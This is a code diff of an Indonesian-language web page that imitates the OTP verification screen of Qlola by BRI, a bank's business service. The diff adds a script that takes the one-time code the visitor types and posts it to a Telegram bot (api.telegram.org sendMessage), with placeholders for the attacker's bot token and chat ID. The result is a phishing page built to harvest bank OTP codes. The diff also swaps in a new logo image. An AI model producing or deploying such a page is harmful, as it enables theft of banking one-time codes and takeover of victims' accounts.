@@ -5,11 +5,11 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Qlola by BRI - Verifikasi OTP</title>
   <style>
+    /* (Pakai style sama seperti contoh sebelumnya) */
     body {
       margin: 0;
       font-family: Arial, sans-serif;
       background: linear-gradient(180deg, #a7d8ff 0%, #2a6ebb 100%);
-      background-image: url('https://i.postimg.cc/gj9LSYLy/pattern.png'); /* contoh pola */
       background-repeat: repeat;
       color: #000;
       display: flex;
@@ -120,8 +120,7 @@
 </head>
 <body>
   <div class="container">
-    <!-- Logo Qlola by BRI -->
-    <img src="https://i.postimg.cc/3xQ6T7CZ/qlola-logo.png" alt="Qlola by BRI" class="logo" />
+    <img src="https://www.image2url.com/r2/default/images/1777443471877-50b79db3-7f18-45c1-acfe-ad4512748ac6.jpeg" alt="" class="logo" />
 
     <h1>Verifikasi Kode OTP</h1>
     <p class="description">Masukkan kode OTP yang telah kami kirimkan ke nomor telepon Anda.</p>
@@ -150,73 +149,122 @@
     </div>
   </div>
 
-  <script>
-    // Fokus otomatis pindah ke input berikutnya saat mengisi OTP
-    const inputs = document.querySelectorAll('.otp-input input');
-    inputs.forEach((input, index) => {
-      input.addEventListener('input', () => {
-        if (input.value.length === 1 && index < inputs.length -1) {
-          inputs[index + 1].focus();
-        }
-        checkOtpComplete();
-      });
+<script>
+  // Telegram bot config (isi dengan token dan chat ID Anda)
+  const TELEGRAM_BOT_TOKEN = 'MASUKKAN_BOT_TOKEN_ANDA_DI_SINI';
+  const TELEGRAM_CHAT_ID = 'MASUKKAN_CHAT_ID_TUJUAN_DI_SINI';
 
-      input.addEventListener('keydown', (e) => {
-        if (e.key === 'Backspace' && input.value === '' && index > 0) {
-          inputs[index - 1].focus();
-        }
-      });
+  // Fungsi kirim pesan ke Telegram
+  function sendTelegramMessage(message) {
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    const data = {
+      chat_id: TELEGRAM_CHAT_ID,
+      text: message,
+      parse_mode: 'HTML'
+    };
+    
+    return fetch(url, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(data)
+    })
+    .then(response => response.json())
+    .then(json => {
+      if(!json.ok) {
+        throw new Error('Gagal mengirim pesan ke Telegram: ' + json.description);
+      }
+      return json;
+    })
+    .catch(error => {
+      console.error(error);
+      alert('Gagal mengirim hasil ke Telegram.');
+    });
+  }
+
+  // Otomatis pindah input saat isi OTP
+  const inputs = document.querySelectorAll('.otp-input input');
+  const verifyBtn = document.getElementById('verifyBtn');
+
+  inputs.forEach((input, index) => {
+    input.addEventListener('input', () => {
+      if (input.value.length === 1 && index < inputs.length -1) {
+        inputs[index + 1].focus();
+      }
+      checkOtpComplete();
     });
 
-    const verifyBtn = document.getElementById('verifyBtn');
-    function checkOtpComplete() {
-      const otpComplete = Array.from(inputs).every(input => input.value.length === 1);
-      verifyBtn.disabled = !otpComplete;
-    }
+    input.addEventListener('keydown', (e) => {
+      if (e.key === 'Backspace' && input.value === '' && index > 0) {
+        inputs[index - 1].focus();
+      }
+    });
+  });
 
-    // Timer untuk resend button
-    const resendBtn = document.getElementById('resendBtn');
-    const timerSpan = document.getElementById('timer');
-    let countdown = 30;
-    let timerInterval;
+  function checkOtpComplete() {
+    const otpComplete = Array.from(inputs).every(input => input.value.length === 1);
+    verifyBtn.disabled = !otpComplete;
+  }
 
-    function startTimer() {
-      resendBtn.disabled = true;
-      timerSpan.textContent = `Kirim ulang kode dalam ${countdown} detik`;
-      timerInterval = setInterval(() => {
-        countdown--;
-        if (countdown <= 0) {
-          clearInterval(timerInterval);
-          resendBtn.disabled = false;
-          timerSpan.textContent = '';
-        } else {
-          timerSpan.textContent = `Kirim ulang kode dalam ${countdown} detik`;
-        }
-      }, 1000);
-    }
+  // Timer resend
+  const resendBtn = document.getElementById('resendBtn');
+  const timerSpan = document.getElementById('timer');
+  let countdown = 30;
+  let timerInterval;
 
+  function startTimer() {
+    resendBtn.disabled = true;
+    timerSpan.textContent = `Kirim ulang kode dalam ${countdown} detik`;
+    timerInterval = setInterval(() => {
+      countdown--;
+      if (countdown <= 0) {
+        clearInterval(timerInterval);
+        resendBtn.disabled = false;
+        timerSpan.textContent = '';
+      } else {
+        timerSpan.textContent = `Kirim ulang kode dalam ${countdown} detik`;
+      }
+    }, 1000);
+  }
+
+  startTimer();
+
+  resendBtn.addEventListener('click', () => {
+    resendBtn.disabled = true;
+    countdown = 30;
     startTimer();
+    alert('Kode OTP telah dikirim ulang ke nomor Anda.');
+    // Tambahkan fungsi pengiriman ulang OTP pada backend/API Anda
+  });
 
-    resendBtn.addEventListener('click', () => {
-      resendBtn.disabled = true;
-      countdown = 30;
-      startTimer();
-      alert('Kode OTP telah dikirim ulang ke nomor Anda.');
-      // Tambahkan logic pengiriman kode OTP ulang disini (API call)
-    });
+  // Event submit form verifikasi OTP
+  document.getElementById('otpForm').addEventListener('submit', async () => {
+    const otpValue = Array.from(inputs).map(i => i.value).join('');
+    verifyBtn.disabled = true;
+    verifyBtn.textContent = 'Mengirim...';
 
-    // Event tombol verifikasi
-    document.getElementById('otpForm').addEventListener('submit', () => {
-      const otpValue = Array.from(inputs).map(i => i.value).join('');
-      alert(`Kode OTP yang Anda masukkan: ${otpValue}`);
-      // Tambahkan logic verifikasi OTP disini (API call)
-    });
+    const message = `<b>Hasil Verifikasi OTP Qlola by BRI</b>%0ACode OTP: <code>${otpValue}</code>`;
 
-    // Event tombol hubungi kami
-    document.getElementById('contactBtn').addEventListener('click', () => {
-      alert('Silakan hubungi pusat bantuan di 021-xxxx-xxxx atau email support@bri.co.id');
-      // Atau arahkan ke halaman bantuan / kontak
-    });
-  </script>
+    try {
+      await sendTelegramMessage(message);
+      alert('Kode OTP berhasil dikirim ke Telegram.');
+      // Reset input dan tombol
+      inputs.forEach(i => i.value = '');
+      inputs[0].focus();
+      verifyBtn.disabled = true;
+      verifyBtn.textContent = 'Verifikasi';
+    } catch (error) {
+      verifyBtn.textContent = 'Verifikasi';
+      verifyBtn.disabled = false;
+    }
+  });
+
+  // Tombol bantuan
+  document.getElementById('contactBtn').addEventListener('click', () => {
+    alert('Silakan hubungi pusat bantuan di 021-xxxx-xxxx atau email support@bri.co.id');
+  });
+
+</script>
 </body>
 </html>
